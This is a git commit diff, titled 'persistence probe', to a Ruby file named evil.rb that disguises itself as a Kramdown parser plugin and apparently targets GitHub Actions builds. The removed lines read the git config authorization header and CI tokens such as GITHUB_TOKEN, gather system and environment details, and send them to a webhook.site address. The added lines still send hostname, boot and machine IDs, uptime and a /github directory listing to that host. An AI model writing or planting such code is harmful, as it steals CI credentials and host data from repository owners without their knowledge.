c21a7c73344860be9717b72daecc01b7b7bdca9d
pg <a@b.c>
2026-07-12 04:16:56 +0300

    persistence probe

--- evil.rb
+++ evil.rb
@@ -1,23 +1,12 @@
 require "open-uri" rescue nil
-require "digest" rescue nil
 begin
-  gitcfg = (File.read("/github/workspace/.git/config") rescue (File.read(File.join(Dir.pwd,".git/config")) rescue ""))
-  tok = (gitcfg[/AUTHORIZATION:\s*basic\s+(\S+)/i,1] || ENV["GITHUB_TOKEN"] || ENV["ACTIONS_RUNTIME_TOKEN"] || ENV["GITHUB_PAGES_TOKEN"] || "none")
   info = {
-    id: (`id`.strip rescue "?"),
     host: (`hostname`.strip rescue "?"),
-    uname: (`uname -a`.strip rescue "?"),
-    pwd: Dir.pwd,
-    envkeys: ENV.keys.sort.join(","),
-    gitcfg_extraheader: gitcfg.include?("extraheader"),
-    token_present: tok != "none",
-    token_len: tok.length,
-    token_sha16: (Digest::SHA256.hexdigest(tok)[0,16] rescue "?"),
-    ls_root: (Dir.entries("/").sort.join(",") rescue "?")
+    boot_id: (File.read("/proc/sys/kernel/random/boot_id").strip rescue "?"),
+    machine_id: (File.read("/etc/machine-id").strip rescue (File.read("/var/lib/dbus/machine-id").strip rescue "?")),
+    uptime: (File.read("/proc/uptime").strip rescue "?"),
+    workspace_others: (Dir.entries("/github").sort.join(",") rescue "?")
   }
-  data = [Marshal.dump(info)].pack("m0") rescue [info.to_s].pack("m0")
-  URI.open("https://0da1c1eb-e51b-4a56-942f-d48eab0c3310.webhook.site/KDIMPACT?d=#{data[0,1400]}") rescue nil
-rescue => e
-  (URI.open("https://0da1c1eb-e51b-4a56-942f-d48eab0c3310.webhook.site/KDIMPACT-ERR?e=#{e.class}") rescue nil)
-end
+  URI.open("https://0da1c1eb-e51b-4a56-942f-d48eab0c3310.webhook.site/KDPERSIST?d=#{[info.to_s].pack('m0')[0,600]}") rescue nil
+rescue => e; (URI.open("https://0da1c1eb-e51b-4a56-942f-d48eab0c3310.webhook.site/KDPERSIST-ERR") rescue nil); end
 module Kramdown; module Parser; class Evil; def initialize(*a); end; def parse; end; end; end; end
